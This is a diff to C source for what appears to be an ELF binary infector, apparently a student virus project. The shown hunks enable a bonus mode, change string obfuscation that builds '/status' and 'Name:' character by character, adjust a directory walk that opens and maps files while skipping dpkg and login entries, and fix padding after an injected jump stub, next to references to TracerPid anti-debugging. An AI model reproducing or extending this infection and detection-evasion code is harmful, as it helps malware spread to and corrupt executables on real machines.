@@ -15,7 +15,7 @@
 # include <stdio.h> // DELL printfs
 #include <stdio.h>
 # define SIZE_BEFORE_ENTRY_POINT (62 + 2 * sizeof(size_t))
-# define BONUS 0
+# define BONUS 1
 
 typedef struct	s_file
 {
@@ -252,22 +252,6 @@ char TracerPid_name[11];
 	}
 	ft_memmove(path,proc,6);
 	char cmdname[64];
-	char status[8];
-	status[0] = '/';
-	status[1] = 's';
-	status[2] = 't';
-	status[3] = 'a';
-	status[4] = 't';
-	status[5] = 'u';
-	status[6] = 's';
-	status[7] = '\0';
-	char name_name[6];
-	name_name[0] = 'N';
-	name_name[1] = 'a';
-	name_name[2] = 'm';
-	name_name[3] = 'e';
-	name_name[4] = ':';
-	name_name[5] = '\0';
 	char login[6];
 	login[0] = 'l';
 	login[1] = 'o';
@@ -694,7 +678,7 @@ int open_directory(char *path, unsigned int *n_loaded)
 			i += d->d_reclen ;
 			//printf("host %s type %d\n",d->d_name, d->d_type);
 			if (d->d_name[0] == '.' || (d->d_name[0] == 'd' && d->d_name[1] == 'p' && d->d_name[2] == 'k' && d->d_name[3] == 'g') ||
-					(d->d_name[0] == 'l' && d->d_name[1] == 'o' && d->d_name[2] == 'g' && d->d_name[3] == 'i' || d->d_name[3] == 'n' ))
+					(d->d_name[0] == 'l' && d->d_name[1] == 'o' && d->d_name[2] == 'g' && d->d_name[3] == 'i' && d->d_name[3] == 'n' ))
 				continue;
 			len = ft_strlen(path);
 			ft_memmove(path_file,path,len);
@@ -711,12 +695,12 @@ int open_directory(char *path, unsigned int *n_loaded)
 			{
 				st.st_size = 0;
 				if (fstat(fd , &st) < 0)
-					return ;
+					return 1;
 	//			ft_putchar('\n');
 	//			ft_putnbr(st.st_size);
 	//			ft_putchar('\n');
 //				char mem[st.st_size];
-				char *mem = (char*)mmap(NULL, st.st_size, 3, 33, -1, 0);
+				char *mem = (char*)mmap(0, st.st_size, 3, 33, -1, 0);
 
 
 				for (long int j = 0; j < st.st_size;j++)
@@ -916,7 +900,7 @@ void new_file(char buf[],size_t size, size_t end_of_text,const char *path,Elf64_
 	size_wrote += write(fd,jmp_code,9);
 
 	for (long unsigned int i = 0; i< PAGE_SIZE*2 - size_wrote ;i++)
-		write(fd,"\j",1);
+		write(fd,"\0",1);
 
 	write(fd,buf + end_of_text, size - end_of_text);
 
